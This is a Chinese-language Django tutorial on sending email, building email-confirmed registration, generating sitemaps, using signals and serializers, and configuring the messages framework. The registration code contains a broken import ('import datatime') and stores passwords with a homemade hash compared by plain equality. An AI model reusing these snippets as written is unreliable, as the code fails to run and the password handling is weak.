有时要根据用户表单的输入来构造电子邮件,这就存在头部注入攻击的风险,Django提供了一定的防范能力,但更多时候还需要自己编写安全防范代码

</pre>接收用户输入的主题、邮件内容和发送方,将邮件发送到系统管理员,如果检查到用户的输入带有头部注入攻击的可能性会弹出BadHeaderError异常<textarea>
from django.core.mail import send_mail, BadHeaderError
from django.http import HttpResponse, HttpResponseRedirect
def send_email(request):
    subject = request.POST.get('subject', '')
    message = request.POST.get('message', '')
    from_email = request.POST.get('from_email', '')
    if subject and message and from_email:
        try:
            send_mail(subject, message, from_email, ['admin@example.com'])
        except BadHeaderError:
            return HttpResponse('Invalid header found.')
        return HttpResponseRedirect('/contact/thanks/')
    else:
        return HttpResponse('Make sure all fields are entered and valid.')

</textarea><pre>
【 发送多媒体邮件 】
默认发送的邮件都是纯文本格式的,Django提供了一个EmailMultiAlternatives类,可同时发送文本和HTML内容(超链接、图片,甚至视频和JS动作)
但接收方的邮件服务商为了安全考虑不一定支持多媒体邮件,幸运的是对于以http和https开头的链接还是可以点击的,为了保证邮件内容能被阅读,请务必同时发送纯文本邮件

</pre><textarea>
from django.core.mail import EmailMultiAlternatives

subject, from_email, to = 'hello', 'from@example.com', 'to@example.com'
text_content = 'This is an important message.'
html_content = '< p>This is an < strong>important< /strong> message.< /p>'
msg = EmailMultiAlternatives(subject, text_content, from_email, [to])
msg.attach_alternative(html_content, "text/html")
msg.send()

</textarea>text_content是用于当HTML内容无效时的替代txt文本<textarea>
import os
from django.core.mail import EmailMultiAlternatives
os.environ['DJANGO_SETTINGS_MODULE'] = 'mysite.settings'

if __name__ == '__main__':
    subject, from_email, to = '来自www.liujiangblog.com的测试邮件', 'xxx@sina.com', 'xxx@qq.com'
    text_content = '欢迎访问www.liujiangblog.com,这里是刘江的博客和教程站点,专注于Python和Django技术的分享！'
    html_content = '< p>欢迎访问< a href="http://www.liujiangblog.com" target=blank>www.liujiangblog.com< /a>,这里是刘江的博客和教程站点,本站专注于Python、Django和机器学习技术的分享！< /p>'
    msg = EmailMultiAlternatives(subject, text_content, from_email, [to])
    msg.attach_alternative(html_content, "text/html")
    msg.send()

</textarea><pre>
【 邮件注册确认 】
通常在用户注册成功之后实际登陆之前会发送一封电子邮件到对方的注册邮箱中表示欢迎,进一步的还可能要求用户点击邮件中的链接,进行注册确认
用邮件确认的方式对新注册用户进行审查,既安全又正式,也是目前很多站点的做法

既然要区分通过和未通过邮件确认的用户,那么必须给用户添加一个是否进行过邮件确认的属性。
另外要创建一张新表,用于保存用户的确认码以及注册提交的时间
是否需要创建ConfirmString新表？可否都放在User表里？如果全都放在User中不利于管理,查询速度慢,创建新表有利于区分已确认和未确认的用户
扩展:定时删除未在有效期内进行邮件确认的用户,这个可以用Django的celery实现,或使用Linux的cronb功能

三种获取用户邮箱的方式
1、发送邮件,填写验证码
2、发送验证邮箱链接：注册时填写邮箱发送注册确认邮件,此时user.is_active=Flse,用户点击激活链接再user.is_active=True允许用户登录
3、直接使用邮箱注册

</pre><textarea>
### /login/models.py文件如下:
from django.db import models

class User(models.Model):
    gender = (
        ('male', "男"),
        ('female', "女"),
    )

    name = models.CharField(max_length=128, unique=True)
    password = models.CharField(max_length=256)
    email = models.EmailField(unique=True)
    sex = models.CharField(max_length=32, choices=gender, default="男")
    c_time = models.DateTimeField(auto_now_add=True)
    has_confirmed = models.BooleanField(default=False)  # 未进行邮件注册

    def __str__(self):
        return self.name

    class Meta:
        ordering = ["-c_time"]
        verbose_name = "用户"
        verbose_name_plural = "用户"

class ConfirmString(models.Model):           # ConfirmString模型保存了用户和注册码之间的关系,一对一的形式
    code = models.CharField(max_length=256)  # code字段是哈希后的注册码
    user = models.OneToOneField('User', on_delete=models.CASCADE)  # user是关联的一对一用户
    c_time = models.DateTimeField(auto_now_add=True)               # c_time是注册的提交时间

    def __str__(self):
        return self.user.name + ":   " + self.code

    class Meta:
        ordering = ["-c_time"]
        verbose_name = "确认码"
        verbose_name_plural = "确认码"

### register()视图的逻辑
# make_confirm_string()创建确认码对象,接收一个用户对象作为参数。首先利用datetime模块生成一个当前时间的字符串now,再调用编写的hash_code()方法以用户名为基础,now为'盐',生成一个独一无二的哈希值,再调用ConfirmString模型的create()方法,生成并保存一个确认码对象。最后返回这个哈希值。
import datatime
def make_confirm_string(user):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    code = hash_code(user.name, now)
    models.ConfirmString.objects.create(code=code, user=user,)
    return code

# send_email(email, code)方法接收两个参数,分别是注册的邮箱和生成的哈希值,code参数保存了关键的注册确认码

# settings文件中邮件相关的settings配置:
EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'
EMAIL_HOST = 'smtp.sina.com'
EMAIL_PORT = 25
EMAIL_HOST_USER = 'xxx@sina.com'
EMAIL_HOST_PASSWORD = 'xxxxxx'
CONFIRM_DAYS = 7  # 注册有效期天数

from django.conf import settings  # 导入settings配置文件
def send_email(email, code):
    from django.core.mail import EmailMultiAlternatives
    subject = '来自www.liujiangblog.com的注册确认邮件'
    text_content = '''感谢注册www.liujiangblog.com,这里是刘江的博客和教程站点,专注于Python、Django和机器学习技术的分享！\
                    如果你看到这条消息,说明你的邮箱服务器不提供HTML链接功能,请联系管理员！'''
    html_content = '''
                    <p>感谢注册<a href="http://{}/confirm/?code={}" target=blank>www.liujiangblog.com</a>,\
                    这里是刘江的博客和教程站点,专注于Python、Django和机器学习技术的分享！</p>
                    <p>请点击站点链接完成注册确认！</p>
                    <p>此链接有效期为{}天！</p>
                    '''.format('127.0.0.1:8000', code, settings.CONFIRM_DAYS)
    msg = EmailMultiAlternatives(subject, text_content, settings.EMAIL_HOST_USER, [email])
    msg.attach_alternative(html_content, "text/html")
    msg.send()

def register(request):
    if request.session.get('is_login', None): return redirect('/index/')

    if request.method == 'POST':
        register_form = forms.RegisterForm(request.POST)
        message = "请检查填写的内容！"
        if register_form.is_valid():
            username = register_form.cleaned_data.get('username')
            password1 = register_form.cleaned_data.get('password1')
            password2 = register_form.cleaned_data.get('password2')
            email = register_form.cleaned_data.get('email')
            sex = register_form.cleaned_data.get('sex')

            if password1 != password2:
                message = '两次输入的密码不同！'
                return render(request, 'login/register.html', locals())
            else:
                same_name_user = models.User.objects.filter(name=username)
                if same_name_user:
                    message = '用户名已经存在'
                    return render(request, 'login/register.html', locals())
                same_email_user = models.User.objects.filter(email=email)
                if same_email_user:
                    message = '该邮箱已经被注册了！'
                    return render(request, 'login/register.html', locals())

                new_user = models.User()
                new_user.name = username
                new_user.password = hash_code(password1)
                new_user.email = email
                new_user.sex = sex
                new_user.save()

                code = make_confirm_string(new_user)
                send_email(email, code)

                message = '请前往邮箱进行确认！'
                return render(request, 'login/confirm.html', locals())
        else:
            return render(request, 'login/register.html', locals())
    register_form = forms.RegisterForm()
    return render(request, 'login/register.html', locals())

### 处理邮件确认请求
首先在根目录的urls.py中添加一条url:
path('confirm/', views.user_confirm),
其次在login/views.py中添加一个user_confirm视图。
def user_confirm(request):
    code = request.GET.get('code', None) # 从请求的url地址中获取确认码
    message = ''
    try:
        confirm = models.ConfirmString.objects.get(code=code)
    except:
        message = '无效的确认请求!'
        return render(request, 'login/confirm.html', locals())

    c_time = confirm.c_time
    now = datetime.datetime.now()
    if now > c_time + datetime.timedelta(settings.CONFIRM_DAYS):
        confirm.user.delete()
        message = '您的邮件已经过期！请重新注册!'
        return render(request, 'login/confirm.html', locals())
    else:
        confirm.user.has_confirmed = True
        confirm.user.save()
        confirm.delete()    # 删除注册码,但不删除用户本身
        message = '感谢确认,请使用账户登录！'
        return render(request, 'login/confirm.html', locals())

### 这里需要一个confirm.html页面,将它创建在/login/templates/login/下面:
< title>注册确认< /title>
< h1 style="margin-left: 100px;">{{ message }}< /h1>
< script>window.setTimeout("window.location='/login/'",2000);< /script>

## 修改登录规则:既然未进行邮件确认的用户不能登录,那么就必须修改登录规则
def login(request):
    if request.session.get('is_login', None):  # 不允许重复登录
        return redirect('/index/')
    if request.method == 'POST':
        login_form = forms.UserForm(request.POST)
        message = '请检查填写的内容！'
        if login_form.is_valid():
            username = login_form.cleaned_data.get('username')
            password = login_form.cleaned_data.get('password')

            try:
                user = models.User.objects.get(name=username)
            except :
                message = '用户不存在！'
                return render(request, 'login/login.html', locals())

            if not user.has_confirmed:
                message = '该用户还未经过邮件确认！'
                return render(request, 'login/login.html', locals())

            if user.password == hash_code(password):
                request.session['is_login'] = True
                request.session['user_id'] = user.id
                request.session['user_name'] = user.name
                return redirect('/index/')
            else:
                message = '密码不正确！'
                return render(request, 'login/login.html', locals())
        else:
            return render(request, 'login/login.html', locals())

    login_form = forms.UserForm()
    return render(request, 'login/login.html', locals())

</textarea>
</div>

<div id="django_sitemap">
<h4>网站地图sitemap</h4><pre>
网站地图是根据网站的结构、框架、内容生成的导航网页,是一个网站所有链接的容器。很多网站的连接层次比较深,蜘蛛很难抓取到,网站地图可以方便搜索引擎或网络蜘蛛抓取网站页面,了解网站的架构,为网络蜘蛛指路,增加网站内容页面的收录概率。网站地图一般存放在域名根目录下并命名为sitemap,比如http://www.liujiangblog.com/sitemap.xml。

Django自带了一个高级的生成网站地图的框架,可以很容易地创建出XML格式的网站地图。创建网站地图,只需编写一个Sitemap类,并在URLconf中编写对应的访问路由。

安装sitemap框架的步骤如下:
1、在INSTALLED_APPS设置中添加'django.contrib.sitemaps' .
2、确认settings.py中的TEMPLATES设置包含DjangoTemplates后端,并将APP_DIRS选项设置为True,其实默认配置就是这样的
3、确认已经安装sites框架,网站地图APP并不要在数据库中建立任何数据库表。修改INSTALLED_APPS的唯一原因是以便Loader()模板加载器可以找到默认模板

初始化
为了在网站上激活站点地图生成功能,请把以下代码添加到URLconf中:
from django.contrib.sitemaps.views import sitemap
url(r'^sitemap\.xml$', sitemap, {'sitemaps': sitemaps}, name='django.contrib.sitemaps.views.sitemap')
当用户访问/sitemap.xml时Django将生成并返回一个网站地图。

网站地图的文件名并不重要,重要的是文件的位置。搜索引擎只会索引网站的当前URL层级及下属层级。例如如果sitemap.xml位于根目录中,它会引用网站中的任何URL,但如果站点地图位于/content/sitemap.xml则它只能引用以/content/开头的网址。

sitemap视图需要一个额外的必需参数:{'sitemaps': sitemaps}。sitemaps应是一个字典,将部门的标签例如news或blog映射到其Sitemap类,例如NewsSitemap或BlogSitemap;也可以映射到Sitemap类的实例,例如BlogSitemap(some_var)

</pre>假设一个博客系统拥有Entry模型,并且希望站点地图包含指向每篇博客文章的所有链接,以下是Sitemap类的写法<textarea>
from django.contrib.sitemaps import Sitemap
from blog.models import Entry

class BlogSitemap(Sitemap):
    changefreq = "never"
    priority = 0.5

    def items(self):
        return Entry.objects.filter(is_draft=False)

    def lastmod(self, obj):
        return obj.pub_date

</textarea><pre>
changefreq和priority分别对应于HTML页面中的< changefreq>和< priority>标签。
items()只是一个返回对象列表的方法。
lastmod方法应该返回一个datetime时间对象。
在此示例中没有编写location方法,但可以自己增加此方法来指定对象的URL。默认location()在每个对象上调用get_absolute_url()并将返回结果作为对象的url,即使用站点地图的模型比如Entry需要在模型内部实现get_absolute_url()方法。

【 Sitemap类详解 】
class Sitemap

Sitemap类可以定义以下方法/属性:
1. items
必须定义,返回对象列表的方法。
框架不关心对象的类型,重要的是这些对象将被传递给location(),lastmod(),changefreq()和priority()方法。

2. location
可选,其值可以是一个方法或属性
如果是一个方法, 它应该为items()返回的对象的绝对路径.
如果它是一个属性,它的值应该是一个字符串,表示items()返回的每个对象的绝对路径。

"绝对路径"表示不包含协议和域名的URL。 例子:
正确:'/foo/bar/'
错误:'example.com/foo/bar/'
错误:'https://example.com/foo/bar/'

如果未提供location,框架将调用items()返回的每个对象上的get_absolute_url()方法。
该属性最终反映到HTML页面上的< loc>< /loc>标签。

3. lastmod
可选。 一个方法或属性。表示当前条目最后的修改时间。

4. changefreq
可选。 一个方法或属性,表示当前条目修改的频率,允许值为:'always'、'hourly'、'daily'、'weekly'、'monthly'、'yearly'、'never'

5. priority
可选。表示当前条目在网站中的权重系数,优先级。示例值:0.4,1.0。 页面的默认优先级为0.5,最高为1.0。

6. protocol
可选的。定义网站地图中的网址的协议('http'或'https')。

7. limit
可选的。定义网站地图的每个网页上包含的最大超级链接数。

8. i18n
可选的。一个boolean属性,定义是否应使用所有语言生成此网站地图。默认值为False。

【 快捷方式 】
sitemap框架提供了一个快捷类迅速生成网站地图:
class GenericSitemap
通过它无需为sitemap编写单独的视图模块,直接在URLCONF中,获取对象,获取参数,传递参数,设置url

</pre><textarea>
from django.conf.urls import url
from django.contrib.sitemaps import GenericSitemap
from django.contrib.sitemaps.views import sitemap
from blog.models import Entry

info_dict = {
    'queryset': Entry.objects.all(),
    'date_field': 'pub_date',
}

urlpatterns = [
    # some generic view using info_dict
    # ...

    # the sitemap
    url(r'^sitemap\.xml$', sitemap,
        {'sitemaps': {'blog': GenericSitemap(info_dict, priority=0.6)}},
        name='django.contrib.sitemaps.views.sitemap'),
]

</textarea><pre>
【 静态视图的Sitemap 】
有时候不希望在站点地图中出现一些静态页面,比如商品的详细信息页面,解决方案是在items中显式列出这些页面的网址名称,并在网站地图的location方法中调用reverse()

</pre><textarea>
# sitemaps.py,这种做法的本质是先找出不想展示的页面,然后反向选择,获取想生成站点条目的对象,最后展示到站点地图中,可以简单的理解为'反选'
from django.contrib import sitemaps
from django.urls import reverse

class StaticViewSitemap(sitemaps.Sitemap):
    priority = 0.5
    changefreq = 'daily'

    def items(self):
        return ['main', 'about', 'license']

    def location(self, item):
        return reverse(item)

# urls.py
from django.conf.urls import url
from django.contrib.sitemaps.views import sitemap

from .sitemaps import StaticViewSitemap
from . import views

sitemaps = {
    'static': StaticViewSitemap,
}

urlpatterns = [
    url(r'^$', views.main, name='main'),
    url(r'^about/$', views.about, name='about'),
    url(r'^license/$', views.license, name='license'),
    # ...
    url(r'^sitemap\.xml$', sitemap, {'sitemaps': sitemaps},
        name='django.contrib.sitemaps.views.sitemap')
]

</textarea>
</div>

<div id="django_signal">
<h4>signal 信号调度 demo:站内消息通知</h4><pre>
django自带一套信号机制来帮助在框架的不同位置之间传递信息。即当某一事件发生时信号系统可以允许一个或多个发送者(senders)将通知或信号(signals)发送给一组接受者(receivers)。
signal用于在框架执行操作时解耦,当某些动作发生的时候系统会根据信号定义的函数执行相应的操作

信号系统包含以下三要素:
发送者－信号的发出方
信号－信号本身
接收者－信号的接受者

使用得比较多的信号类型就是django/db/models/signal.py(如:用户注册成功后发送邮件或进行其他操作)以及用户登录的django/contrib/auth/signals.py(用户登录成功后,给用户发送消息)

【 内置信号 】
1.Model_signals(django/db/models/signal.py)
pre_init                        # Django中的model对象执行其构造方法前,自动触发
post_init                       # Django中的model对象执行其构造方法后,自动触发
pre_save                        # Django中的model对象保存前,自动触发
post_save                       # Django中的model对象保存后,自动触发
pre_delete                      # Django中的model对象删除前,自动触发
post_delete                     # Django中的model对象删除后,自动触发
m2m_changed                     # Django中的model对象使用m2m字段操作数据库的第三张表(add,remove,clear,update),自动触发
class_prepared                  # 程序启动时,检测到已注册的model类,对于每一个类,自动触发

# django.db.models.signals.pre_save 在某个Model保存之前调用
# django.db.models.signals.post_save 在某个Model保存之后调用
# django.db.models.signals.pre_delete 在某个Model删除之前调用
# django.db.models.signals.post_delete 在某个Model删除之后调用

django.db.models.signals.pre_save & django.db.models.signals.post_save
在ORM模型的save()方法调用之前或之后发送信号

django.db.models.signals.pre_delete & django.db.models.signals.post_delete
在ORM模型或查询集的delete()方法调用之前或之后发送信号

django.db.models.signals.m2m_changed
当多对多字段被修改时发送信号。

2.Managemeng_signals
pre_migrate                     # 执行migrate命令前,自动触发
post_migrate                    # 执行migrate命令后,自动触发

</pre><textarea>
$ cat /home/berlin75/.local/lib/python3.6/site-packages/django/db/models/signals.py
from functools import partial

from django.db.models.utils import make_model_tuple
from django.dispatch import Signal

class_prepared = Signal(providing_args=["class"])

class ModelSignal(Signal):
    """
    Signal subclass that allows the sender to be lazily specified as a string of the `app_label.ModelName` form.
    """
    def _lazy_method(self, method, apps, receiver, sender, **kwargs):
        from django.db.models.options import Options

        # This partial takes a single optional argument named "sender".
        partial_method = partial(method, receiver, **kwargs)
        if isinstance(sender, str):
            apps = apps or Options.default_apps
            apps.lazy_model_operation(partial_method, make_model_tuple(sender))
        else:
            return partial_method(sender)

    def connect(self, receiver, sender=None, weak=True, dispatch_uid=None, apps=None):
        self._lazy_method(
            super().connect, apps, receiver, sender,
            weak=weak, dispatch_uid=dispatch_uid,
        )

    def disconnect(self, receiver=None, sender=None, dispatch_uid=None, apps=None):
        return self._lazy_method(
            super().disconnect, apps, receiver, sender, dispatch_uid=dispatch_uid
        )


pre_init = ModelSignal(providing_args=["instance", "args", "kwargs"], use_caching=True)
post_init = ModelSignal(providing_args=["instance"], use_caching=True)

pre_save = ModelSignal(providing_args=["instance", "raw", "using", "update_fields"], use_caching=True)
post_save = ModelSignal(providing_args=["instance", "raw", "created", "using", "update_fields"], use_caching=True)

pre_delete = ModelSignal(providing_args=["instance", "using"], use_caching=True)
post_delete = ModelSignal(providing_args=["instance", "using"], use_caching=True)

m2m_changed = ModelSignal(providing_args=["action", "instance", "reverse", "model", "pk_set", "using"], use_caching=True,)

pre_migrate = Signal(providing_args=["app_config", "verbosity", "interactive", "using", "apps", "plan"])
post_migrate = Signal(providing_args=["app_config", "verbosity", "interactive", "using", "apps", "plan"])

</textarea><pre>
3.Request/response_signals(django/core/signals.py)
request_started                 # 请求到来前,自动触发
request_finished                # 请求结束后,自动触发
got_request_exception           # 请求异常时,自动触发

# django.core.signals.request_started 在建立Http请求时发送
# django.core.signals.request_finished 在关闭Http请求时发送

django.core.signals.request_started & django.core.signals.request_finished
当接收和关闭HTTP请求时发送信号。

4.Test_signals
setting_changed                 # 配置文件改变时,自动触发
template_rendered               # 模板执行渲染操作时,自动触发

5.Datebase_Wrapperd(django/db/backends/signals.py)
connection_created              # 创建数据库连接时,自动触发

6.用户登录
$ cat /home/berlin75/.local/lib/python3.6/site-packages/django/contrib/auth/signals.py
from django.dispatch import Signal
user_logged_in = Signal(providing_args=['request', 'user'])
user_login_failed = Signal(providing_args=['credentials', 'request'])
user_logged_out = Signal(providing_args=['request', 'user'])

</pre>对于Django内置的信号,仅需注册指定信号,当程序执行相应操作时,系统会自动触发注册函数<textarea>
以post_save信号类型进行说明:
在相应的应用myapp目录下的__init__.py文件中进行定义
或者可以另外创建一个.py文件,再在__init__.py文件导入该文件

# polls/__init__.py
default_app_config = 'polls.apps.PollsConfig'

# polls/apps.py
from django.apps import AppConfig

class PollsConfig(AppConfig):
    name = 'polls'

    def ready(self):
        super().ready()
        from . import signals

# polls/signals.py
from django.db.models.signals import post_save
from django.dispatch import receiver
from .models import Question

# 创建函数,监听信号,当信号触发时进行函数的调用
# 将函数进行注册,声明为回调函数,第一个参数为信号类型,如果声明sender,那么接收器只会接收这个sender的信号,这里声明为只接收Question模型的信号
# post_save在某个Model保存之后调用,对于每个唯一的dispatch_uid,接收器都只被信号调用一次
@receiver(post_save, sender=Question, dispatch_uid="my_unique_identifier")
def my_handler(sender, instance, **kwargs):
    # **kwargs必须,第一个参数必须为sender,当信号类型为Model_signals,接收到的第二个参数instance为模型对象,可直接使用这个模型实例对象进行操作
    print("**********************")
    print(sender)   # < class 'polls.models.Question'>
    print(instance) # what is the month?
    print(kwargs)   # {'signal': < django.db.models.signals.ModelSignal object at 0x7fe8bbd37e80>, 'created': True, 'update_fields': None, 'raw': False, 'using': 'default'}
    print("**********************")

# request_finished信号,配置之后django接收到所有的request请求结束以后,都会调用这个接收器回调函数
from django.core.signals import request_finished
@receiver(request_finished)
def my_callback(sender, **kwargs):
    print("1**********************")
    print(sender) # < class 'django.core.handlers.wsgi.WSGIHandler'>
    print(kwargs) # {'signal': < django.dispatch.dispatcher.Signal object at 0x7f12105be208>}
    print("2**********************")

</textarea><pre>
【 监听信号 】
要接收信号,请使用Signal.connect()方法注册一个接收器,当信号发送后会调用这个接收器
Signal.connect(receiver, sender=None, weak=True, dispatch_uid=None)
参数:
receiver :当前信号连接的回调函数,也就是处理信号的函数。
sender :指定从哪个发送方接收信号。
weak : 是否弱引用
dispatch_uid :信号接收器的唯一标识符,以防信号多次发送。

</pre>下面以如何接收每次HTTP请求结束后发送的信号为例,连接到Django内置的现成的request_finished信号<textarea>
1. 编写接收器
接收器其实就是一个Python函数或者方法,所有的接收器都必须接收一个sender参数和一个**kwargs通配符参数
def my_callback(sender, **kwargs):
    print("Request finished!")

2. 连接接收器
有两种方法可以连接接收器,一种是下面的手动方式:
from django.core.signals import request_finished
request_finished.connect(my_callback)

另一种是使用receiver()装饰器:
from django.core.signals import request_finished
from django.dispatch import receiver

@receiver(request_finished)
def my_callback(sender, **kwargs):
    print("Request finished!")

3. 接收特定发送者的信号
一个信号接收器,通常不需要接收所有的信号,只需要接收特定发送者发来的信号,所以需要在sender参数中指定发送方。下面的例子只接收MyModel模型的实例保存前的信号。

from django.db.models.signals import pre_save
from django.dispatch import receiver
from myapp.models import MyModel

@receiver(pre_save, sender=MyModel)
def my_handler(sender, **kwargs):  # my_handler函数只在MyModel实例保存时被调用
    ...

4. 防止重复信号
为了防止重复信号,可以设置dispatch_uid参数来标识接收器,标识符通常是一个字符串:

from django.core.signals import request_finished
request_finished.connect(my_callback, dispatch_uid="my_unique_identifier")

最后的结果是,对于每个唯一的dispatch_uid值,接收器都只绑定到信号一次。

</textarea><pre>
【 自定义信号 】
除了Django提供的内置信号,很多时候需要自己定义信号。

类原型:class Signal(providing_args=list)
所有的信号都是django.dispatch.Signal的实例。providing_args参数是一个列表,由信号将提供给监听者的参数的名称组成,可以在任何时候修改providing_args参数列表。

定义pizza_done信号,它向接受者提供size和toppings参数
import django.dispatch
pizza_done = django.dispatch.Signal(providing_args=["toppings", "size"])

【 发送信号 】
Signal.send(sender, **kwargs)
Signal.send_robust(sender,** kwargs)
必须提供sender参数(大部分情况下是一个类名),并且可以提供任意数量的其他关键字参数。
send()和send_robust()返回一个元组对的列表[(receiver, response), ... ],表示接收器和响应值二元元组的列表。

</pre>例如这样来发送前面的pizza_done信号<textarea>
class PizzaStore(object):
    ...

    def send_pizza(self, toppings, size):
        pizza_done.send(sender=self.__class__, toppings=toppings, size=size)
        ...

</textarea><pre>
【 断开信号 】
Signal.disconnect(receiver=None, sender=None, dispatch_uid=None)
Signal.disconnect()用来断开信号的接收器。和Signal.connect()中的参数相同,接收器成功断开则返回True,否则返回False。

</pre>【 信号使用实例 】<textarea>
### 在根URLCONF中配置路由:
from django.conf.urls import path
from django.contrib import admin
from app1 import views

urlpatterns = [
    path('signal/', views.create_signal),
]

### 最终views.py文件如下:
# 在views.py中自定义一个信号以及创建create_signal视图,自定义的信号名叫work_done,接收请求url地址和请求时间两个参数,create_signal视图内获取请求的url,生成请求的时间,作为参数,传递到send方法,这样就发送了一个信号

import time
import django.dispatch
from django.dispatch import receiver
from django.shortcuts import HttpResponse

# 定义信号work_done
work_done = django.dispatch.Signal(providing_args=['path', 'time'])

def create_signal(request):
    url_path = request.path
    print("我已经做完了工作。现在我发送一个信号出去,给那些指定的接收器。")

    # 发送信号,将请求的IP地址和时间一并传递过去
    work_done.send(create_signal, path=url_path, time=time.strftime("%Y-%m-%d %H:%M:%S"))
    return HttpResponse("200,ok")

# 接收器:通过装饰器注册为接收器。内部接收字典参数,并解析打印出来
@receiver(work_done, sender=create_signal)
def my_callback(sender, **kwargs):
    print("我在%s时间收到来自%s的信号,请求url为%s" % (kwargs['time'], sender, kwargs["path"]))

测试:python manage.py runserver启动服务器,浏览器访问http://127.0.0.1:8000/signal/。重点不再浏览器的返回,而在后台返回的内容,在命令行环境中看到:
我已经做完了工作。现在我发送一个信号出去,给那些指定的接收器。
我在2017-12-18 17:10:12时间收到来自< function create_signal at 0x0000000003AFF840>的信号,请求url为/signal/

</textarea>
</div>

<div id="django_serializers">
<h4>序列化 from django.core import serializers</h4><pre>
Django的序列化工具serializers可以将Django的模型转换成其它格式的数据,通常这种其它格式的数据是基于文本的,并用于数据交换\传输过程

一、序列化数据
from django.core import serializers
data = serializers.serialize("xml", SomeModel.objects.all())

serialize方法至少接收两个参数,第一个是要序列化成为的数据格式如xml,第二个是要序列化的数据对象,数据通常是ORM模型的QuerySet,一个可迭代的对象。

还有一种比较复杂但钩子更多的使用方法,主要是使用了serializers的get_serializer()和getvalue()方法
XMLSerializer = serializers.get_serializer("xml")
xml_serializer = XMLSerializer()
xml_serializer.serialize(queryset)
data = xml_serializer.getvalue()

当需要将序列化的数据保存到一个文件对象中的时候上面的方式就非常有用
with open("file.xml", "w") as out: xml_serializer.serialize(SomeModel.objects.all(), stream=out)

1. 序列化指定字段
如果不想序列化模型对象所有字段的内容,只想序列化某些指定的字段,可以使用fields参数
from django.core import serializers
data = serializers.serialize('xml', SomeModel.objects.all(), fields=('name','size'))
这样只有name和size字段会被序列化,但有一个例外,模型的主键pk被隐式输出了,虽然它并不包含在fields参数中。

2. 序列化继承模型
class Place(models.Model): name = models.CharField(max_length=50)
class Restaurant(Place): serves_hot_dogs = models.BooleanField(default=False)

如果只序列化餐厅模型:
data = serializers.serialize('xml', Restaurant.objects.all())
序列化输出上的字段将只包含serves_hot_dogs属性,基类的name属性并不会一起序列化。

为了完全序列化Restaurant实例,还需要将Place模型序列化,如下所示:
all_objects = list(Restaurant.objects.all()) + list(Place.objects.all())
data = serializers.serialize('xml', all_objects)

二、反序列化数据
for obj in serializers.deserialize("xml", data): do_something_with(obj)
data参数是以前序列化后生成的数据(一个字符串或数据流)。deserialize()方法返回一个迭代器,通过for循环拿到它内部的每个元素。
,deserialize返回的迭代器对象不是简单的Django模型的对象,而是特殊的DeserializedObject实例,调用DeserializedObject.save()方法可以将对象保存到数据库。如果序列化数据中的pk属性不存在或为null,则新实例将保存到数据库。
首先必须保证序列化数据是合乎本地ORM模型属性的,否则保存的过程中会出现各种错误

将DeserializedObject保存到数据库:
for deserialized_object in serializers.deserialize("xml", data):
    if object_should_be_saved(deserialized_object): deserialized_object.save()

三、可序列化的格式
Djanggo支持三种序列化格式,其中的一些可能需要安装第三方库支持:
xml
json
yaml

1. XML
</pre><textarea>
xml格式相当简单:
< ?xml version="1.0" encoding="utf-8"?>
< django-objects version="1.0">
    < object pk="123" model="sessions.session">
        < field type="DateTimeField" name="expire_date">2013-01-16T08:16:59.844560+00:00< /field>
        < !-- ... -->
    < /object>
< /django-objects>

外键字段被序列化成下面的格式:
< object pk="27" model="auth.permission">
    < !-- ... -->
    < field to="contenttypes.contenttype" name="content_type" rel="ManyToOneRel">9< /field>
    < !-- ... -->
< /object>

多对多字段被序列化成下面的样子:
< object pk="1" model="auth.user">
    < !-- ... -->
    < field to="auth.permission" name="user_permissions" rel="ManyToManyRel">
        < object pk="46">< /object>
        < object pk="47">< /object>
    < /field>
< /object>

</textarea><pre>
2. JSON
序列化成json格式后类似:

</pre><textarea>
[
    {
        "pk": "4b678b301dfd8a4e0dad910de3ae245b",
        "model": "sessions.session",
        "fields": {
            "expire_date": "2013-01-16T08:16:59.844Z",
            ...
        }
    }
]

</textarea>如果ORM模型具有自定义的字段,那么Django提供的序列化工具就无法正常工作,必须自己编写相应部分的序列化代码<textarea>
from django.utils.encoding import force_text
from django.core.serializers.json import DjangoJSONEncoder

class LazyEncoder(DjangoJSONEncoder):
    def default(self, obj):
        if isinstance(obj, YourCustomType):
            return force_text(obj)
        return super().default(obj)

# 上面编写了一个LazyEncoder类用来实现序列化方法,使用下面的方法调用它:
from django.core.serializers import serialize
serialize('json', SomeModel.objects.all(), cls=LazyEncoder)

# Python本身不支持序列化类到json格式,Django实现了它自己的模型类序列化为json的方法,但也仅限于此,如果在Django内写了一个别的自定义类,一样无法序列化为json格式,除非自己实现,像上面的例子所示。

</textarea><pre>
3. YAML
yaml的格式和json很像

</pre><textarea>
-   fields: {expire_date: !!timestamp '2013-01-16 08:16:59.844560+00:00'}
    model: sessions.session
    pk: 4b678b301dfd8a4e0dad910de3ae245b

</textarea>
</div>

<div id="django_message">
<h4>消息框架message 站内消息通知</h4><pre>
在网页应用中经常需要在处理完表单或其它类型的用户输入后显示一个一次性通知信息给用户,Django提供了基于Cookie或会话的消息框架messages,无论是匿名用户还是认证的用户。这个消息框架允许在一个请求中临时存储消息,并在后续请求(通常是下一个请求)中提取它们并显示。每个消息都带有一个特定的level标签表示其优先级如info、 warning或error

一、启用消息框架
Django的messages消息框架的实现依赖messages中间件和对应的context processor上下文处理器
通过django-admin startproject xxx命令创建工程时,已经默认在settings.py中开启了消息框架功能需要的所有的设置:
1、INSTALLED_APPS中注册的'django.contrib.messages'。
2、MIDDLEWARE中添加'django.contrib.sessions.middleware.SessionMiddleware'和'django.contrib.messages.middleware.MessageMiddleware',messages框架默认使用的存储后端为sessions。所以Session中间件必须被启用,并出现在Message中间件之前。
3、在模板设置中定义的DjangoTemplates的context_processor选项包含django.contrib.messages.context_processors.messages

二、配置消息引擎
通常使用默认配置,但如果有需要也可以配置

1. 存储后端
消息框架可以使用不同的后端存储临时消息,Django在django.contrib.messages中提供了三个内置的存储类:

(1)class storage.session.SessionStorage
该类存储请求会话中的所有消息,因此它需要Django的contrib.sessions的应用程序。

(2)class storage.cookie.CookieStorage
该类将消息数据存储在cookie中(使用秘密散列签名以防止操作),以便在请求之间持久化通知。如果cookie数据大小超过2048字节则删除旧消息。

(3)class storage.fallback.FallbackStorage
这个类首先使用CookieStorage,然后返回到使用SessionStorage来存储不能放入单个cookie的消息。它还需要Django的contrib.sessions的应用程序。
这种行为尽量避免向会话写入内容。它应该在一般情况下提供最好的性能。
FallbackStorage是默认的存储类。如果它不适合需要,可以通过设置MESSAGE_STORAGE的完整导入路径来选择另一个存储类,例如:
